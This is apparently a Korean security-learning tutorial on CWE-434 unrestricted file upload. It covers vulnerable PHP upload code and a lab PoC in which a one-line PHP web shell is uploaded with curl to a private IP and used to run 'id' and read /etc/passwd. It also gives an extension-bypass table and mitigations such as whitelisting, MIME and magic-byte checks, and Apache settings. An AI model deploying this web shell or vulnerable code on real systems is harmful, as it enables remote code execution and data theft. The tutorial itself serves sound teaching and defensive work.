# CWE-434: Unrestricted File Upload

파일 업로드 시 확장자·MIME·내용 검증 없이 서버에 저장하여 공격자가 웹셸(.php)을 업로드하고 원격 코드를 실행할 수 있는 취약점입니다.

## 목차

| 섹션                                                                                                 |
|------------------------------------------------------------------------------------------------------|
| [1. 개요](#1-개요) / [2. 원리](#2-원리) / [3. PoC](#3-poc) / [4. 영향](#4-영향) / [5. 대응](#5-대응) |

---

## 1. 개요

| 항목      | 내용                                                      |
|-----------|-----------------------------------------------------------|
| CWE ID    | CWE-434                                                   |
| 이름      | Unrestricted Upload of File with Dangerous Type           |
| OWASP     | A04:2021 Insecure Design                                  |
| 영향      | RCE (웹셸 설치 → 서버 장악)                               |
| 빈도      | 높음 — 게시판, 프로필 사진, 문서 업로드 기능에서 발생     |
| 전제 조건 | 업로드 검증 없음 + 업로드 디렉토리에서 스크립트 실행 가능 |

[⬆ 목차로 돌아가기](#목차)

---

## 2. 원리

### 취약 코드 (PHP)

```php
<?php
// 파일 유형 검증 없이 그대로 저장 — 취약
$target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $target);
chmod($target, 0777);
echo "Upload: <a href='/uploads/" . basename($_FILES['file']['name']) . "'>link</a>";
?>
```

### 발생 조건

| 조건                      | 설명                                       |
|---------------------------|--------------------------------------------|
| 확장자 검증 없음          | .php, .phtml, .phar 등 실행 가능 파일 허용 |
| MIME 타입 미확인          | Content-Type 헤더를 신뢰하거나 검증 안 함  |
| 파일 내용 미검증          | 매직바이트(file signature) 확인 안 함      |
| 업로드 디렉토리 실행 가능 | Apache가 uploads/ 에서 PHP를 해석함        |
| 권한 과다                 | 777, owner root → 누구나 쓰기 가능         |

### 공격 흐름

```
1. 공격자: backdoor.php 파일 생성
   <?php echo shell_exec($_GET['cmd']); ?>

2. 업로드 폼에서 backdoor.php 제출

3. 서버: /var/www/html/uploads/backdoor.php 로 저장

4. 공격자: http://target/uploads/backdoor.php?cmd=id 접속
   → 웹 서버 권한으로 명령 실행
```

[⬆ 목차로 돌아가기](#목차)

---

## 3. PoC

### 실습 URL

```
http://10.200.101.182/file_upload.php
```

### 테스트 단계

1. 로컬에 웹셸 파일 생성:

```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/backdoor.php
```

2. 업로드:

```bash
curl -F "file=@/tmp/backdoor.php" http://10.200.101.182/file_upload.php
```

3. 실행 확인:

```bash
curl "http://10.200.101.182/uploads/backdoor.php?cmd=id"
# 예상: uid=48(apache) gid=48(apache)

curl "http://10.200.101.182/uploads/backdoor.php?cmd=cat+/etc/passwd"
# 예상: root:x:0:0:root:/root:/bin/bash ...
```

### 확장자 우회 테스트

| 파일명          | 실행 여부 | 설명                           |
|-----------------|-----------|--------------------------------|
| `shell.php`     | ✅        | 기본 PHP 확장자                |
| `shell.phtml`   | ✅        | Apache 기본 PHP 핸들러         |
| `shell.php5`    | ✅        | PHP 5 호환 핸들러              |
| `shell.phar`    | ✅        | PHP 아카이브                   |
| `shell.php.jpg` | ❌        | 더블 확장자 (설정에 따라 다름) |
| `shell.jpg.php` | ✅        | 마지막 확장자 기준 실행        |

[⬆ 목차로 돌아가기](#목차)

---

## 4. 영향

| 영향            | 설명                                |
|-----------------|-------------------------------------|
| 웹셸 설치       | 지속적 원격 접근 (삭제 전까지 유효) |
| 서버 장악       | 리버스 셸 → 내부 침투               |
| 데이터 탈취     | DB 접속 정보 → 데이터 유출          |
| 악성코드 호스팅 | 업로드 경로를 악성코드 배포에 활용  |
| 디페이스        | 웹 페이지 변조                      |

[⬆ 목차로 돌아가기](#목차)

---

## 5. 대응

### 확장자 화이트리스트

```php
<?php
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die("허용되지 않은 파일 형식");
}
?>
```

### MIME 타입 + 매직바이트 검증

```php
<?php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
if (!in_array($mime, $allowed_mime)) {
    die("허용되지 않은 MIME 타입: $mime");
}
?>
```

### 업로드 디렉토리 PHP 실행 금지 (httpd.conf)

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    RemoveHandler .php .phtml .phps .phar
    AddType application/octet-stream .php .phtml .phar
</Directory>
```

### 파일명 랜덤화

```php
<?php
// 원본 파일명 사용 금지 → UUID + 허용 확장자
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$target = $upload_dir . $new_name;
?>
```

### 저장 분리

| 방법                   | 설명                                    |
|------------------------|-----------------------------------------|
| DocumentRoot 외부 저장 | `/var/uploads/` (웹에서 직접 접근 불가) |
| S3 등 외부 스토리지    | 서버 파일 시스템에 저장하지 않음        |
| 별도 다운로드 스크립트 | `download.php?id=123` → readfile()      |

[⬆ 목차로 돌아가기](#목차)

---

## 참고 자료

- CWE-434: [cwe.mitre.org/data/definitions/434.html](https://cwe.mitre.org/data/definitions/434.html) — ★★★☆☆
- OWASP File Upload: [owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) — ★★★☆☆

---

## 통계

![GitHub stars](https://img.shields.io/github/stars/siasia86/system-engineering-resources?style=social)
![GitHub forks](https://img.shields.io/github/forks/siasia86/system-engineering-resources?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/siasia86/system-engineering-resources?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/siasia86/system-engineering-resources)
![License](https://img.shields.io/github/license/siasia86/system-engineering-resources)
![Actions](https://img.shields.io/github/actions/workflow/status/siasia86/system-engineering-resources/update-date.yml)

---

**작성일**: 2026-07-02

**마지막 업데이트**: 2026-07-02

© 2026 siasia86. Licensed under CC BY 4.0.
